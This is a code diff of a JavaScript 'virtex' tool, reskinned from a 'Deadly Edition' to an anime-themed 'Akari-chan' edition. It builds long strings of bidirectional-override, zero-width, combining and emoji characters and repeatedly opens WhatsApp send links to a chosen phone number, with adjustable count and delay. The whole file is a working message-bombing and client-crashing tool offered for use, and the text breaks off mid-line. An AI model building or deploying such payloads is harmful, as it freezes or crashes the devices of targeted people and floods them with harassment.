@@ -1,32 +1,83 @@
-// DATABASE VIRTEX - DEADLY EDITION
+// ============================================
+// AKARI-CHAN VIRTEX - ANIME EDITION
+// Version: 1.0
+// ============================================
+
+// Database Virtex
 const virtexDatabase = {
-    1: "‮⁠‍‪⁡‭‏‎﻿" + "̷̸̡̢̧̨̛̖̗̘̙".repeat(500) + "Z̷̡̢̧̨̛̖̗̘̙͓͔͕͖͙͚".repeat(200),
-    
-    2: "⁠⁡⁢⁣⁤".repeat(1000) + "‮⁠‍‪⁡‭".repeat(500) + "‏‎﻿".repeat(300),
-    
-    3: "😈👿💀👻👽🤖🎃".repeat(500) + "🔪💣🔥⚡💫💥".repeat(500) + "💔❌⚠️☠️⚰️".repeat(500),
-    
-    4: "﷽".repeat(1000) + "𒐫𒐪𒐩𒐨𒐧".repeat(500) + "𐌰𐌱𐌲𐌳𐌴".repeat(500),
-    
-    5: "‮⁠‍‪⁡‭".repeat(2000) + "̷̸̡̢̧̨".repeat(2000) + "Z̷̡̢̺͆".repeat(1000)
+    1: "\u202E\u202A\u202D".repeat(300) + "🌸💕✨".repeat(100),
+    2: "\u200B\u200C\u200D".repeat(500) + "💕".repeat(200),
+    3: "😊💕🌸✨🌟💫⭐".repeat(300) + "💖".repeat(200),
+    4: "🌟✨⭐💫⚡".repeat(400) + "\u202E".repeat(300),
+    5: "🌸💕✨🌟⭐💫💖".repeat(500) + "\u202E\u202A\u202D".repeat(500)
 };
 
 // Global variables
-let attackInterval;
 let attackCount = 0;
-let deathCount = 0;
+let totalSent = 0;
+let sessionCount = 0;
 let isAttacking = false;
+let attackTimer = null;
+let currentTarget = '';
+let currentType = '1';
+let currentJumlah = 5;
+let currentDelay = 1.5;
 
-// Load death count from localStorage
-if (localStorage.getItem('deathCount')) {
-    deathCount = parseInt(localStorage.getItem('deathCount'));
-    document.getElementById('deathCount').textContent = deathCount;
+// Load saved data
+function loadSavedData() {
+    if (localStorage.getItem('akariTotalSent')) {
+        totalSent = parseInt(localStorage.getItem('akariTotalSent'));
+    }
+    if (localStorage.getItem('akariSession')) {
+        sessionCount = parseInt(localStorage.getItem('akariSession'));
+    }
+    
+    document.getElementById('deathCount').textContent = totalSent;
+    document.getElementById('sessionCount').textContent = sessionCount;
 }
 
-// Main attack function
+// Save data
+function saveData() {
+    localStorage.setItem('akariTotalSent', totalSent.toString());
+    localStorage.setItem('akariSession', sessionCount.toString());
+}
+
+// Adjust jumlah
+function adjustJumlah(change) {
+    const input = document.getElementById('jumlah');
+    let val = parseInt(input.value) + change;
+    if (val < 1) val = 1;
+    if (val > 100) val = 100;
+    input.value = val;
+    currentJumlah = val;
+}
+
+// Adjust delay
+function adjustDelay(change) {
+    const input = document.getElementById('delay');
+    let val = parseFloat(input.value) + change;
+    if (val < 0.5) val = 0.5;
+    if (val > 5) val = 5;
+    input.value = val.toFixed(1);
+    currentDelay = val;
+}
+
+// Set jumlah
+function setJumlah(val) {
+    document.getElementById('jumlah').value = val;
+    currentJumlah = val;
+}
+
+// Set delay
+function setDelay(val) {
+    document.getElementById('delay').value = val;
+    currentDelay = val;
+}
+
+// Main function
 function kirimVirtex() {
     if (isAttacking) {
-        addLog('⚠️ ATTACK ALREADY IN PROGRESS!', 'warning');
+        addLog('⚠️ Masih ada pengiriman berjalan!', 'warning');
         return;
     }
     
@@ -35,222 +86,208 @@ function kirimVirtex() {
     const jumlah = parseInt(document.getElementById('jumlah').value);
     const delay = parseFloat(document.getElementById('delay').value) * 1000;
     
-    // Validation
+    // Validasi
     if (!target || target.length < 10) {
-        addLog('💀 ERROR: Invalid target number!', 'error');
+        addLog('❌ Nomor target tidak valid! Minimal 10 digit', 'error');
         return;
     }
     
-    if (jumlah < 1 || jumlah > 999) {
-        addLog('💀 ERROR: Attack count must be 1-999!', 'error');
+    if (target.startsWith('0')) {
+        addLog('❌ Gunakan format internasional (62xxx), bukan 0xxx', 'error');
         return;
     }
     
-    // Activate attack mode
+    // Start attack
     isAttacking = true;
     attackCount = 0;
+    currentTarget = target;
+    currentType = type;
     
     // Update UI
     document.getElementById('sendBtn').disabled = true;
-    document.getElementById('sendBtn').classList.add('attacking');
     document.getElementById('emergencyStop').disabled = false;
-    document.getElementById('statusText').textContent = '🔴 ATTACK IN PROGRESS';
-    document.getElementById('statusText').style.color = '#ff0000';
+    document.getElementById('statusText').textContent = '⚡ Mengirim... Mohon tunggu';
+    
+    // Log start
+    addLog('✨✨✨ MEMULAI PENGIRIMAN ✨✨✨', 'separator');
+    addLog(`📱 Target: ${target}`, 'info');
+    addLog(`📦 Jumlah: ${jumlah}x`, 'info');
+    addLog(`⏱️ Delay: ${delay/1000} detik`, 'info');
+    addLog('✨✨✨✨✨✨✨✨✨✨✨', 'separator');
     
     // Get virtex
     const virtex = virtexDatabase[type];
-    const namaTipe = document.getElementById('virtexType').options[document.getElementById('virtexType').selectedIndex].text;
     
-    // Log start
-    addLog('☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️', 'separator');
-    addLog(`💀 NUCLEAR ATTACK INITIATED`, 'info');
-    addLog(`🎯 TARGET: ${target}`, 'info');
-    addLog(`⚔️ WEAPON: ${namaTipe}`, 'info');
-    addLog(`🔁 ATTACKS: ${jumlah}x`, 'info');
-    addLog(`⏱️ DELAY: ${delay/1000}s`, 'info');
-    addLog('☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️', 'separator');
-    
-    // Start attack
-    function sendAttack() {
+    // Send function
+    function send() {
         if (attackCount < jumlah && isAttacking) {
             attackCount++;
-            deathCount++;
+            totalSent++;
+            sessionCount++;
             
-            // Encode and send
-            const encodedVirtex = encodeURIComponent(virtex + generateChaos());
-            const waURL = `https://api.whatsapp.com/send?phone=${target}&text=${encodedVirtex}`;
-            window.open(waURL, '_blank');
+            // Encode and open
+            const encoded = encodeURIComponent(virtex + getRandomSparkles());
+            const url = `https://api.whatsapp.com/send?phone=${target}&text=${encoded}`;
+            window.open(url, '_blank');
             
-            // Log success
-            addLog(`💥 [${attackCount}/${jumlah}] ATTACK LAUNCHED`, 'success');
+            // Log
+            addLog(`✅ [${attackCount}/${jumlah}] Terkirim!`, 'success');
             
-            // Update death counter
-            document.getElementById('deathCount').textContent = deathCount;
-            localStorage.setItem('deathCount', deathCount);
+            // Update stats
+            document.getElementById('deathCount').textContent = totalSent;
+            document.getElementById('sessionCount').textContent = sessionCount;
+            saveData();
             
-            // Screen shake effect
-            screenShake();
+            // Vibrate if supported
+            if (navigator.vibrate) {
+                navigator.vibrate(50);
+            }
             
             if (attackCount < jumlah && isAttacking) {
-                setTimeout(sendAttack, delay);
+                attackTimer = setTimeout(send, delay);
             } else {
                 finishAttack();
             }
         }
     }
     
-    setTimeout(sendAttack, 1000);
+    // Start after 1 second
+    attackTimer = setTimeout(send, 1000);
 }
 
 // Emergency stop
 function emergencyStop() {
-    if (isAttacking) {
-        isAttacking = false;
-        addLog('⚠️⚠️⚠️ EMERGENCY ABORT ⚠️⚠️⚠️', 'warning');
-        addLog('🛑 ATTACK HALTED BY USER', 'warning');
-        finishAttack();
+    if (attackTimer) {
+        clearTimeout(attackTimer);
+        attackTimer = null;
     }
+    
+    isAttacking = false;
+    
+    addLog('⏹️ PENGIRIMAN DIHENTIKAN', 'warning');
+    
+    // Update UI
+    document.getElementById('sendBtn').disabled = false;
+    document.getElementById('emergencyStop').disabled = true;
+    document.getElementById('statusText').textContent = 'Online • Siap bantu Akari-chan!';
 }
 
 // Finish attack
 function finishAttack() {
     isAttacking = false;
-    attackCount = 0;
+    attackTimer = null;
     
+    addLog('✨✨✨ SELESAI ✨✨✨', 'complete');
+    addLog(`💕 Total terkirim: ${totalSent}`, 'info');
+    
+    // Update UI
     document.getElementById('sendBtn').disabled = false;
-    document.getElementById('sendBtn').classList.remove('attacking');
     document.getElementById('emergencyStop').disabled = true;
-    document.getElementById('statusText').textContent = '🔴 ARMED AND DANGEROUS';
-    
-    addLog('☠️☠️☠️ ATTACK COMPLETED ☠️☠️☠️', 'complete');
-    addLog(`💀 TOTAL DEATH COUNT: ${deathCount}`, 'info');
+    document.getElementById('statusText').textContent = 'Online • Siap bantu Akari-chan!';
 }
 
-// Generate chaos characters
-function generateChaos() {
-    const chars = ['̷','̸','̡','̢','̧','̨','̛','̖','̗','̘','̙','͓','͔','͕','͖','͙','͚'];
-    let result = '';
-    for (let i = 0; i < 100; i++) {
-        result += chars[Math.floor(Math.random() * chars.length)];
-    }
-    return result;
-}
-
-// Screen shake effect
-function screenShake() {
-    document.body.style.animation = 'none';
-    document.body.offsetHeight;
-    document.body.style.animation = 'bodyPulse 4s infinite';
-    
-    const intensity = Math.random() * 10 + 5;
-    document.querySelector('.container').style.transform = 
-        `translate(${Math.random()*intensity-intensity/2}px, ${Math.random()*intensity-intensity/2}px)`;
-    
-    setTimeout(() => {
-        document.querySelector('.container').style.transform = 'translate(0, 0)';
-    }, 200);
-}
-
-// Add log function
+// Add log
 function addLog(message, type) {
-    const logContainer = document.getElementById('logContainer');
-    const logEntry = document.createElement('p');
+    const logBox = document.getElementById('logContainer');
+    const entry = document.createElement('div');
     
-    const timestamp = new Date().toLocaleTimeString('en-US', { hour12: false });
+    const time = new Date();
+    const timestamp = `${time.getHours().toString().padStart(2,'0')}:${time.getMinutes().toString().padStart(2,'0')}:${time.getSeconds().toString().padStart(2,'0')}`;
+    
+    let color = '#b23b5e';
+    let emoji = '💬';
     
     switch(type) {
         case 'error':
-            logEntry.style.color = '#ff0000';
-            logEntry.innerHTML = `[${timestamp}] 💀 ${message}`;
+            color = '#f44336';
+            emoji = '❌';
             break;
         case 'success':
-            logEntry.style.color = '#ff6666';
-            logEntry.innerHTML = `[${timestamp}] 🔥 ${message}`;
+            color = '#4caf50';
+            emoji = '✅';
             break;
         case 'info':
-            logEntry.style.color = '#ffaa00';
-            logEntry.innerHTML = `[${timestamp}] ⚡ ${message}`;
+            color = '#2196f3';
+            emoji = 'ℹ️';
             break;
         case 'warning':
-            logEntry.style.color = '#ffff00';
-            logEntry.innerHTML = `[${timestamp}] ⚠️ ${message}`;
+            color = '#ff9800';
+            emoji = '⚠️';
             break;
         case 'separator':
-            logEntry.style.color = '#660000';
-            logEntry.style.textAlign = 'center';
-            logEntry.innerHTML = message;
+            color = '#ff69b4';
+            emoji = '';
             break;
         case 'complete':
-            logEntry.style.color = '#ff00ff';
-            logEntry.style.fontWeight = 'bold';
-            logEntry.style.fontSize = '1.1em';
-            logEntry.innerHTML = `[${timestamp}] ☠️ ${message}`;
+            color = '#ff1493';
+            emoji = '🎉';
             break;
-        default:
-            logEntry.style.color = '#ff6666';
-            logEntry.innerHTML = `[${timestamp}] ${message}`;
     }
     
-    logContainer.appendChild(logEntry);
-    logContainer.scrollTop = logContainer.scrollHeight;
+    entry.innerHTML = `<small style="color:#999">[${timestamp}]</small> ${emoji} ${message}`;
+    entry.style.color = color;
+    entry.style.margin = '6px 0';
+    entry.style.padding = '6px 10px';
+    entry.style.background = 'rgba(255,240,245,0.5)';
+    entry.style.borderRadius = '12px';
+    entry.style.borderLeft = `3px solid ${color}`;
     
-    // Auto delete old logs
-    if (logContainer.children.length > 50) {
-        logContainer.removeChild(logContainer.children[0]);
+    logBox.appendChild(entry);
+    logBox.scrollTop = logBox.scrollHeight;
+    
+    // Limit logs
+    while (logBox.children.length > 50) {
+        logBox.removeChild(logBox.children[0]);
     }
 }
 
 // Clear log
 function clearLog() {
-    const logContainer = document.getElementById('logContainer');
-    logContainer.innerHTML = '<p class="log-initial">☠️ System armed. Ready to kill. ☠️</p>';
-    addLog('🗑️ BATTLE LOG CLEARED', 'warning');
+    const logBox = document.getElementById('logContainer');
+    logBox.innerHTML = '<div class="log-initial">🌸 Selamat datang, Akari-chan siap membantu! 🌸</div>';
+    addLog('📝 Log dibersihkan', 'info');
 }
 
 // Export log
 function exportLog() {
-    const logContainer = document.getElementById('logContainer');
-    let logText = 'OXYX VIRTEX - BATTLE LOG\n';
-    logText += '========================\n\n';
+    const logBox = document.getElementById('logContainer');
+    let text = 'AKARI-CHAN VIRTEX - LOG\n';
+    text += '=======================\n';
+    text += `Tanggal: ${new Date().toLocaleString()}\n`;
+    text += `Total terkirim: ${totalSent}\n`;
+    text += '=======================\n\n';
     
-    Array.from(logContainer.children).forEach(child => {
-        logText += child.innerText + '\n';
+    Array.from(logBox.children).forEach(child => {
+        text += child.innerText + '\n';
     });
     
-    const blob = new Blob([logText], { type: 'text/plain' });
+    const blob = new Blob([text], {type: 'text/plain'});
     const url = URL.createObjectURL(blob);
     const a = document.createElement('a');
     a.href = url;
-    a.download = `battle-log-${new Date().toISOString().slice(0,19).replace(/:/g, '-')}.txt`;
+    a.download = `akari-log-${Date.now()}.txt`;
     a.click();
     
-    addLog('📤 BATTLE LOG EXPORTED', 'info');
+    addLog('📥 Log diekspor', 'info');
 }
 
-// Number control buttons
-document.querySelectorAll('.num-up').forEach(btn => {
-    btn.addEventListener('click', function() {
-        const input = this.closest('.number-wrapper').querySelector('input');
-        input.stepUp();
-        input.dispatchEvent(new Event('change'));
-    });
-});
-
-document.querySelectorAll('.num-down').forEach(btn => {
-    btn.addEventListener('click', function() {
-        const input = this.closest('.number-wrapper').querySelector('input');
-        input.stepDown();
-        input.dispatchEvent(new Event('change'));
-    });
-});
-
-// Enter key
-document.addEventListener('keypress', function(e) {
-    if (e.key === 'Enter' && !isAttacking) {
-        kirimVirtex();
+// Get random sparkles
+function getRandomSparkles() {
+    const sparkles = ['✨','🌟','💫','⭐','🌸','💕'];
+    let result = '';
+    for (let i = 0; i < 20; i++) {
+        result += sparkles[Math.floor(Math.random() * sparkles.length)];
     }
-});
+    return result;
+}
 
-// Random death messages
-const deathMessages = [
-    "Another one bites the dust
+// Initialize
+document.addEventListener('DOMContentLoaded', function() {
+    loadSavedData();
+    addLog('🌸 Akari-chan online! Selamat datang!', 'info');
+    
+    // Set initial values
+    document.getElementById('jumlah').value = currentJumlah;
+    document.getElementById('delay').value = currentDelay.toFixed(1);
+    
+    // Prevent
